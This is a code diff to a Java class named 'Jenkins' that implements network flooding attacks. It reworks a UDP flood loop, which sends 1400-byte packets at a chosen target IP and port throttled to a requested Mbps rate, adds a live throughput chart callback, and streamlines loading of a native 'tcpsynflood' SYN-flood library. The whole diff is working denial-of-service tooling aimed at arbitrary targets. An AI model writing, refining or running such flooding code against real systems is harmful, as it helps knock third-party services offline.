@@ -37,37 +37,47 @@ public class Jenkins {
     }
 
     // UDP Flood method
-    public void udpFlood(String targetIp, int targetPort, int bytesPerSecond) {
-        log("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");
+    public void udpFlood(String targetIp, int targetPort, int targetMbps, ChartUpdateCallback chartCallback) {
+        log("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + targetMbps + " Mbps");
 
         try (DatagramSocket socket = new DatagramSocket()) {
             InetAddress targetAddress = InetAddress.getByName(targetIp);
-            byte[] buffer = new byte[1300]; // Adjust packet size if needed
+            byte[] buffer = new byte[1400]; // Adjust packet size if needed
             DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);
 
             long startTime = System.currentTimeMillis();
             long bytesSent = 0;
             int packetsSent = 0;
+            long targetBytesPerSecond = targetMbps * 125000L; // Convert Mbps to bytes per second
+            long initialStartTime = startTime;
 
             while (!stopAttack) {
+                long currentTime = System.currentTimeMillis();
+                long elapsedTime = currentTime - startTime;
+
+                if (elapsedTime >= 1000) {
+                    double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
+                    log(String.format("Sent %d packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
+                    
+                    double elapsedTimeSeconds = (System.currentTimeMillis() - initialStartTime) / 1000.0;
+                    chartCallback.update(elapsedTimeSeconds, actualMbps);
+                    
+                    startTime = currentTime;
+                    bytesSent = 0;
+                    packetsSent = 0;
+                }
+
                 socket.send(packet);
                 bytesSent += buffer.length;
                 packetsSent++;
 
-                if (packetsSent % 1000 == 0) { // Log every 1000 packets
-                    long elapsedTime = System.currentTimeMillis() - startTime;
-                    double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
-                    log(String.format("Sent %d packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
-                }
-
-                // Add rate limiting if necessary
-                if (bytesSent >= bytesPerSecond) {
-                    long elapsedTime = System.currentTimeMillis() - startTime;
-                    if (elapsedTime < 1000) {
-                        Thread.sleep(1000 - elapsedTime);
+                // Calculate sleep time to maintain the target rate
+                long expectedBytesSent = (elapsedTime * targetBytesPerSecond) / 1000;
+                if (bytesSent > expectedBytesSent) {
+                    long sleepTime = (bytesSent - expectedBytesSent) * 1000 / targetBytesPerSecond;
+                    if (sleepTime > 0) {
+                        Thread.sleep(sleepTime);
                     }
-                    startTime = System.currentTimeMillis();
-                    bytesSent = 0;
                 }
             }
         } catch (Exception e) {
@@ -80,27 +90,9 @@ public class Jenkins {
     public native boolean tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond);
 
     static {
-        System.out.println("Working Directory: " + System.getProperty("user.dir"));
         try {
-            String libraryPath = System.getProperty("java.library.path");
-            System.out.println("Java Library Path: " + libraryPath);
-            File nativeDir = new File(libraryPath);
-            System.out.println("Native directory exists: " + nativeDir.exists());
-            if (nativeDir.exists() && nativeDir.isDirectory()) {
-                String[] contents = nativeDir.list();
-                System.out.println("Native directory contents: " + (contents != null ? String.join(", ", contents) : "empty"));
-                File dllFile = new File(nativeDir, "tcpsynflood.dll");
-                System.out.println("DLL file exists: " + dllFile.exists());
-                System.out.println("DLL file path: " + dllFile.getAbsolutePath());
-                if (dllFile.exists()) {
-                    System.loadLibrary("tcpsynflood");
-                    System.out.println("tcpsynflood library loaded successfully");
-                } else {
-                    throw new UnsatisfiedLinkError("tcpsynflood.dll not found in " + nativeDir.getAbsolutePath());
-                }
-            } else {
-                throw new UnsatisfiedLinkError("Native directory does not exist or is not a directory: " + nativeDir.getAbsolutePath());
-            }
+            System.loadLibrary("tcpsynflood");
+            System.out.println("tcpsynflood library loaded successfully");
         } catch (UnsatisfiedLinkError e) {
             System.err.println("Failed to load tcpsynflood library: " + e.getMessage());
             e.printStackTrace();
@@ -197,5 +189,9 @@ public class Jenkins {
             log("Error retrieving MAC address: " + e.getMessage());
             return null;
         }
+    }
+
+    public interface ChartUpdateCallback {
+        void update(double elapsedTimeSeconds, double actualMbps);
     }
 }
